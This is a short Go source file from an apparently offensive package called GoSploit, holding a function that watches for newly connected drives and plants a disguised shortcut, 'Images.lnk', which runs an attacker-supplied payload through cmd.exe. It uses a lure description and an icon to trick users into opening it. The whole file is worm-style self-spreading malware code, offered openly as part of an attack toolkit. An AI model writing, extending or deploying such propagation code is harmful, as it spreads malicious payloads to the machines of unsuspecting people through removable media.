package GoSploit

import (
	"github.com/F-r-o-i-d/GoExF/GoExF/GoSploit/EvilFile"
	"github.com/F-r-o-i-d/GoExF/GoExF/GoSploit/Recons"
)

func SelfSpreading(payload string) {
	Recons.OnNewDriveThreaded(func(key string, state int) {
		if state == 0 {
			lnk := EvilFile.EvilLnk{
				Name:        "Images.lnk",
				Payload:     payload,
				Interface:   "cmd.exe",
				Description: "Images chaude",
				Path:        key + "\\",
				IconPath:    key + "\\icon.ico",
			}
			lnk.Build()
		}
	})
}
